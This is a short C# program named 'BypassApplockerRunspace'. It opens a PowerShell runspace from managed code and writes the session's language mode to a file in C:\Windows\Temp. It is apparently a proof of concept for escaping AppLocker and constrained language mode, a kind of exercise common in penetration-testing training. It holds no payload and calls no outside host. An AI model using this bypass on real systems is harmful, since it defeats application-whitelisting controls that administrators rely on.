using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace BypassApplockerRunspace
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath c:\\Windows\\Temp\\out.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
